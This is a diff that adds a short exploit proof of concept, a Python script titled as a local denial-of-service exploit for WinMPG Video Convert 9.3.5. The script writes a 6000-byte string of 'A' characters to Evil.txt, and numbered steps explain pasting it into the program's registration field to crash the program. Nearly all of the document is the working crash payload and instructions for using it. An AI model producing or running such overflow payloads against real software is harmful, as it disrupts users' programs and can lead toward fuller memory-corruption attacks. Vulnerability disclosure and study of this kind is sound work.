@@ -1,0 +1,29 @@
+# Exploit Title: WinMPG Video Convert Local Dos Exploit
+# Date: 15.03.2019
+# Vendor Homepage:http://www.winmpg.com
+# Software Link:  http://www.winmpg.com/down/WinMPG_VideoConvert.zip
+# Exploit Author: Achilles
+# Tested Version: 9.3.5 and older ones
+# Tested on: Windows XP SP3 EN
+
+
+# 1.- Run python code :WinMPG.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open WinMPG.exe and Click 'ALL-AVI'
+# 4.- In the new Window click Register
+# 5.- Paste the content of EVIL.txt into the Field: 'Name and Registration Code'
+# 6.- Click 'Register'and you will see a crash.
+
+
+
+#!/usr/bin/env python
+buffer = "\x41" * 6000
+
+try:
+	f=open("Evil.txt","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
